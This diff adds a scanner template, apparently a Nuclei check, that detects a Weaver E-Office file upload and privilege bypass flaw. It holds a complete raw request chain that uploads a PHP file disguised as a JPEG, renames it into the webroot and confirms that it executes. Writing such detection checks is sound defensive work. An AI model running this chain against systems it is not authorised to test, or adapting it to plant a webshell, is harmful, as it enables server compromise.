@@ -1,0 +1,88 @@
+id: weaver-eoffice-file-overwrite
+info:
+  name: Weaver E-Office File Overwrite and Privilege Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver E-Office has a privilege bypass vulnerability that allows attackers to upload arbitrary files, potentially leading to server control.
+  reference:
+    - https://www.weaver.com.cn
+  tags: permission-bypass
+variables:
+  cmd: "whoami"
+http:
+  - raw:
+      - |
+        GET /sample.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: session
+        part: header
+        internal: true
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?); path=/"
+
+  - raw:
+      - |
+        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70AcDBrh15OE0Fd0
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        ------WebKitFormBoundary70AcDBrh15OE0Fd0
+        Content-Disposition: form-data; name="name"
+
+        1.jpg
+        ------WebKitFormBoundary70AcDBrh15OE0Fd0
+        Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
+        Content-Type: image/jpeg
+
+        <?php echo md5(233);unlink(__FILE__);?>
+        ------WebKitFormBoundary70AcDBrh15OE0Fd0--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: filename
+        part: body
+        internal: true
+        regex:
+          - "(?s)(.*)"
+
+  - raw:
+      - |
+        GET /general/person_info/signature_picture/do.php?ATTACHMENT_NAME=wuhu.php&ATTACHMENT=D:/eoffice/webroot/attachment/{{filename}}/1.jpg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /attachment/personal/admin/signature_picture.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
